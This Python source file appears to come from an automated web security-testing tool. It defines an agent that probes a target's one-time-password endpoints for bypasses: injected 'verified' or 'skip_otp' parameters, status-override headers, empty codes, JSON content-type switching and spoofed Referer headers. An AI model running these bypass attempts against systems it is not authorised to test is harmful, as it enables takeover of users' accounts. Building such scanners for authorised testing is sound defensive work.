"""
OTP Bypass Testing Agent - Response Manipulation & Client-Side Validation
Integrated with Auth Lab for comprehensive OTP vulnerability detection.
"""

import httpx
import json
import asyncio
import re
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Optional, Tuple
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from models import Target, AuthTestResult, SystemLog
from agents.utils import log_event
from core.session_manager import AuthSession


class OTPBypassAgent:
    """Tests OTP verification for response manipulation, client-side validation, and parameter pollution."""

    def __init__(self, target: Target, session: AsyncSession):
        self.target = target
        self.db_session = session
        self.base_url = target.url
        self.auth_session = AuthSession(self.base_url, self.db_session, self.target.id)
        self.results: List[Dict] = []
        self.client = None

    async def initialize(self):
        """Set up async HTTP client with SSL verification disabled."""
        self.client = httpx.AsyncClient(
            verify=False,
            timeout=15,
            follow_redirects=True,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json, text/html, */*",
                "Accept-Language": "en-US,en;q=0.5",
            }
        )

    async def cleanup(self):
        """Close HTTP client."""
        if self.client:
            await self.client.aclose()
        await self.auth_session.close()

    async def run(self):
        """Main execution flow."""
        await log_event(
            self.db_session, self.target.id, "OTP_BYPASS",
            "Starting OTP bypass testing (response manipulation & validation)", "INFO"
        )
        
        try:
            await self.initialize()
            
            # Discover OTP endpoints
            otp_endpoints = await self._discover_otp_endpoints()
            if not otp_endpoints:
                await log_event(
                    self.db_session, self.target.id, "OTP_BYPASS",
                    "No OTP endpoints discovered. Check manual entry.", "WARNING"
                )
                return
            
            for endpoint_url, payload_template in otp_endpoints:
                await log_event(
                    self.db_session, self.target.id, "OTP_BYPASS",
                    f"Testing OTP endpoint: {endpoint_url}", "INFO"
                )
                await self._test_otp_endpoint(endpoint_url, payload_template)
            
            # Save results to database
            await self._save_results()
            
            await log_event(
                self.db_session, self.target.id, "OTP_BYPASS",
                f"OTP bypass testing completed. Found {len([r for r in self.results if r.get('vulnerable')])} vulnerabilities",
                "SUCCESS" if len([r for r in self.results if r.get('vulnerable')]) == 0 else "WARNING"
            )
        
        except Exception as e:
            await log_event(
                self.db_session, self.target.id, "OTP_BYPASS",
                f"Error during OTP bypass testing: {str(e)}", "ERROR"
            )
        
        finally:
            await self.cleanup()

    async def _discover_otp_endpoints(self) -> List[Tuple[str, Dict]]:
        """
        Discover OTP endpoints from:
        1. Common OTP verification paths
        2. Auth lab collected endpoints
        3. Recon data
        """
        endpoints = []
        common_paths = [
            "/verify-otp", "/verify-otp", "/verify-code", "/validate-otp",
            "/check-otp", "/confirm-otp", "/api/otp/verify", "/otp/verify",
            "/2fa/verify", "/mfa/verify", "/submit-otp", "/authenticate/otp"
        ]
        
        for path in common_paths:
            endpoints.append((urljoin(self.base_url, path), {"otp": "000000"}))
        
        # Also check auth test results for OTP-related endpoints
        result = await self.db_session.execute(
            select(AuthTestResult).where(
                AuthTestResult.target_id == self.target.id,
                AuthTestResult.test_type.ilike("%otp%")
            )
        )
        auth_tests = result.scalars().all()
        
        for test in auth_tests:
            if test.endpoint:
                try:
                    payload = json.loads(test.payload_used or "{}")
                    endpoints.append((test.endpoint, payload))
                except:
                    endpoints.append((test.endpoint, {"otp": "000000"}))
        
        return endpoints

    async def _test_otp_endpoint(self, endpoint_url: str, payload_template: Dict):
        """Run all OTP bypass tests on a single endpoint."""
        
        # Test 1: Response Body Manipulation
        await self._test_response_body_manipulation(endpoint_url, payload_template)
        
        # Test 2: HTTP Status Code Manipulation
        await self._test_status_code_manipulation(endpoint_url, payload_template)
        
        # Test 3: Client-Side Validation
        await self._test_client_side_validation(endpoint_url, payload_template)
        
        # Test 4: Parameter Pollution
        await self._test_parameter_pollution(endpoint_url, payload_template)
        
        # Test 5: Content-Type Switching
        await self._test_content_type_switch(endpoint_url, payload_template)
        
        # Test 6: Referer/Origin Manipulation
        await self._test_referer_manipulation(endpoint_url, payload_template)

    async def _test_response_body_manipulation(self, endpoint: str, base_payload: Dict):
        """
        Test if server accepts modified response body with success indicators.
        """
        test_name = "Response Body Manipulation"
        
        # Send baseline request with wrong OTP
        resp = await self._send_request("POST", endpoint, data=base_payload)
        if not resp:
            return
        
        print(f"[OTP] Baseline response: {resp.status_code}")
        
        # Try parameter injection for response overrides
        success_patterns = [
            {"otp": "000000", "status": "success"},
            {"otp": "000000", "verified": "true"},
            {"otp": "000000", "success": "true"},
            {"otp": "000000", "isValid": "1"},
            {"otp": "000000", "validation_passed": "true"},
            {"otp": "000000", "error": ""},
            {"otp": "000000", "result": "ok"},
        ]
        
        for payload in success_patterns:
            test_payload = {**base_payload, **payload}
            resp = await self._send_request("POST", endpoint, data=test_payload)
            
            if resp and self._check_bypass_success(resp, endpoint):
                self.results.append({
                    "endpoint": endpoint,
                    "test": test_name,
                    "payload": payload,
                    "status_code": resp.status_code,
                    "vulnerable": True,
                    "description": f"OTP bypass via response body manipulation with payload: {payload}"
                })
                return

    async def _test_status_code_manipulation(self, endpoint: str, base_payload: Dict):
        """
        Test if server trusts HTTP status codes for validation.
        """
        test_name = "Status Code Manipulation"
        
        resp = await self._send_request("POST", endpoint, data=base_payload)
        if not resp or resp.status_code not in [400, 401, 403, 422]:
            return
        
        # Some apps accept override headers
        headers_to_try = [
            {"X-Override-Status": "200"},
            {"X-Status-Override": "200"},
            {"HTTP-Status": "200"},
        ]
        
        for extra_headers in headers_to_try:
            test_headers = {**self.client.headers, **extra_headers}
            resp = await self._send_request("POST", endpoint, data=base_payload, headers=test_headers)
            
            if resp and self._check_bypass_success(resp, endpoint):
                self.results.append({
                    "endpoint": endpoint,
                    "test": test_name,
                    "headers": extra_headers,
                    "status_code": resp.status_code,
                    "vulnerable": True,
                    "description": f"OTP bypass via status code manipulation"
                })
                return

    async def _test_client_side_validation(self, endpoint: str, base_payload: Dict):
        """
        Test if OTP validation happens only client-side.
        """
        test_name = "Client-Side Validation"
        
        # Try empty/invalid OTP values
        variations = [
            {**base_payload, "otp": ""},
            {**base_payload, "otp": " "},
            {**base_payload, "otp": "000000"},
            {**base_payload, "otp": "123456"},
            {**base_payload, "otp": "999999"},
            {k: v for k, v in base_payload.items() if "otp" not in k.lower()},
        ]
        
        for payload in variations:
            resp = await self._send_request("POST", endpoint, data=payload)
            
            if resp and self._check_bypass_success(resp, endpoint):
                self.results.append({
                    "endpoint": endpoint,
                    "test": test_name,
                    "payload": payload,
                    "status_code": resp.status_code,
                    "vulnerable": True,
                    "description": f"OTP bypass via client-side validation omission"
                })
                return

    async def _test_parameter_pollution(self, endpoint: str, base_payload: Dict):
        """
        Test if sending override parameters bypasses OTP check.
        """
        test_name = "Parameter Pollution"
        
        override_params = [
            {"verified": "true", "bypass_otp": "true"},
            {"otp_verified": "1", "skip_otp": "true"},
            {"validation": "skip"},
            {"admin": "bypass"},
            {"mfa_disabled": "true"},
        ]
        
        for params in override_params:
            payload = {**base_payload, **params}
            resp = await self._send_request("POST", endpoint, data=payload)
            
            if resp and self._check_bypass_success(resp, endpoint):
                self.results.append({
                    "endpoint": endpoint,
                    "test": test_name,
                    "params": params,
                    "status_code": resp.status_code,
                    "vulnerable": True,
                    "description": f"OTP bypass via parameter pollution: {params}"
                })
                return

    async def _test_content_type_switch(self, endpoint: str, base_payload: Dict):
        """
        Test if sending JSON when form-data is expected bypasses validation.
        """
        test_name = "Content-Type Switching"
        
        # Convert to JSON payload
        json_payload = {}
        for k, v in base_payload.items():
            try:
                json_payload[k] = int(v)
            except ValueError:
                json_payload[k] = v
        
        json_payload["verified"] = True
        
        resp = await self._send_request(
            "POST", endpoint,
            json=json_payload,
            headers={"Content-Type": "application/json"}
        )
        
        if resp and self._check_bypass_success(resp, endpoint):
            self.results.append({
                "endpoint": endpoint,
                "test": test_name,
                "content_type": "application/json",
                "status_code": resp.status_code,
                "vulnerable": True,
                "description": "OTP bypass via content-type switching (JSON)"
            })

    async def _test_referer_manipulation(self, endpoint: str, base_payload: Dict):
        """
        Test if modifying Referer header bypasses OTP validation.
        """
        test_name = "Referer Manipulation"
        
        referers = [
            f"{self.base_url}/dashboard",
            f"{self.base_url}/otp-success",
            f"{self.base_url}/account",
            f"{self.base_url}/",
        ]
        
        for referer in referers:
            headers = {**self.client.headers, "Referer": referer}
            resp = await self._send_request("POST", endpoint, data=base_payload, headers=headers)
            
            if resp and self._check_bypass_success(resp, endpoint):
                self.results.append({
                    "endpoint": endpoint,
                    "test": test_name,
                    "referer": referer,
                    "status_code": resp.status_code,
                    "vulnerable": True,
                    "description": f"OTP bypass via Referer manipulation"
                })
                return

    def _check_bypass_success(self, response: httpx.Response, endpoint: str) -> bool:
        """Check if response indicates successful OTP bypass."""
        if response.status_code not in [200, 201, 204, 302, 303]:
            return False
        
        body = response.text.lower()
        
        success_keywords = [
            "verified", "success", "welcome", "dashboard",
            "authenticated", "logged in", "otp verified", "redirect"
        ]
        
        for keyword in success_keywords:
            if keyword in body:
                return True
        
        # Check JSON response
        if "application/json" in response.headers.get("content-type", ""):
            try:
                j = response.json()
                if isinstance(j, dict):
                    if j.get("success") in (True, "true", 1, "ok"):
                        return True
                    if j.get("status") in ("success", "ok", "verified"):
                        return True
            except:
                pass
        
        return False

    async def _send_request(self, method: str, url: str, **kwargs) -> Optional[httpx.Response]:
        """Send HTTP request safely."""
        try:
            if "headers" not in kwargs:
                kwargs["headers"] = self.client.headers.copy()
            
            response = await self.client.request(method, url, **kwargs)
            return response
        except Exception as e:
            print(f"[OTP] Request failed: {e}")
            return None

    async def _save_results(self):
        """Save OTP bypass test results to database."""
        for result in self.results:
            vuln_type = result.get("test", "OTP_Bypass")
            severity = "Critical" if result.get("vulnerable") else "Low"
            
            auth_result = AuthTestResult(
                target_id=self.target.id,
                endpoint=result.get("endpoint"),
                test_type=vuln_type,
                payload_used=json.dumps(result.get("payload", {})),
                response_preview=result.get("description", ""),
                vulnerability_found=result.get("vulnerable", False),
                severity_level=severity
            )
            
            self.db_session.add(auth_result)
        
        await self.db_session.commit()
